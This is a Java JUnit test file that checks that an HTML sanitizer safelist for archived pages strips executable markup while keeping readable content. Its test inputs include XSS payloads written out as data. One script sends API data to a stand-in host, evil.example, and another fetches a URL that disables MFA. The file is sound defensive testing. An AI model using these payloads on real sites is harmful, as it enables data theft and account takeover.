package services;

import org.jsoup.Jsoup;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.Locale;

import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.containsString;
import static org.hamcrest.Matchers.equalTo;
import static org.hamcrest.Matchers.not;

/**
 * Pins the safelist used for archived pages. The content security policy on the
 * archive route is the primary control, this covers the second line.
 */
public class ArchiveSanitizerTests {

    private String clean(String html) {
        return Jsoup.clean(html, DataService.ARCHIVE_SAFELIST).toLowerCase(Locale.ROOT);
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "<script>fetch('/api/v1/categories').then(r=>r.text()).then(t=>fetch('https://evil.example/'+btoa(t)))</script>",
            "<img src=x onerror=\"fetch('/dashboard/profile?mfa=disable')\">",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<a href=\"javascript:alert(1)\">click</a>",
            "<iframe src=\"https://evil.example\"></iframe>",
            "<object data=\"evil.swf\"></object>",
            "<embed src=\"evil.swf\">",
            "<form action=\"https://evil.example\"><input name=a></form>",
            "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">",
            "<base href=\"https://evil.example/\">",
            "<link rel=stylesheet href=\"https://evil.example/x.css\">",
            "<div onclick=\"alert(1)\">x</div>",
            "<details open ontoggle=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<math><mtext><style><img src=x onerror=alert(1)>"
    })
    public void testExecutableMarkupIsRemoved(String payload) {
        String cleaned = clean(payload);

        assertThat(cleaned, not(containsString("<script")));
        assertThat(cleaned, not(containsString("onerror")));
        assertThat(cleaned, not(containsString("onload")));
        assertThat(cleaned, not(containsString("onclick")));
        assertThat(cleaned, not(containsString("onfocus")));
        assertThat(cleaned, not(containsString("ontoggle")));
        assertThat(cleaned, not(containsString("javascript:")));
        assertThat(cleaned, not(containsString("<iframe")));
        assertThat(cleaned, not(containsString("<object")));
        assertThat(cleaned, not(containsString("<embed")));
        assertThat(cleaned, not(containsString("<form")));
        assertThat(cleaned, not(containsString("http-equiv")));
        assertThat(cleaned, not(containsString("<base")));
        assertThat(cleaned, not(containsString("<link")));
    }

    @Test
    public void testReadableContentIsPreserved() {
        String cleaned = clean("""
                <article><header><h1>Title</h1></header>
                <p style="color:#333">A <strong>paragraph</strong> with a
                <a href="https://example.com/page">link</a>.</p>
                <figure><img src="https://example.com/a.png" alt="a"><figcaption>cap</figcaption></figure>
                <table><tr><td>cell</td></tr></table></article>""");

        assertThat(cleaned, containsString("<article"));
        assertThat(cleaned, containsString("<h1>title</h1>"));
        assertThat(cleaned, containsString("<strong>paragraph</strong>"));
        assertThat(cleaned, containsString("href=\"https://example.com/page\""));
        assertThat(cleaned, containsString("<figcaption>cap</figcaption>"));
        assertThat(cleaned, containsString("<td>cell</td>"));
    }

    @Test
    public void testInlineStylesArePreserved() {
        assertThat(clean("<p style=\"color:red\">x</p>"), containsString("style=\"color:red\""));
    }

    @Test
    public void testInlinedImagesArePreserved() {
        // single-file snapshots embed images as data uris
        String cleaned = clean("<img src=\"data:image/png;base64,iVBORw0KGgo=\" alt=\"x\">");

        assertThat(cleaned, containsString("data:image/png;base64"));
    }

    @Test
    public void testStyleElementIsDroppedAlongWithItsContent() {
        String cleaned = clean("<style>@import url('https://evil.example/x.css');</style><p>kept</p>");

        assertThat(cleaned, not(containsString("@import")));
        assertThat(cleaned, containsString("kept"));
    }

    @Test
    public void testEmptyInputStaysEmpty() {
        assertThat(clean(""), equalTo(""));
    }
}
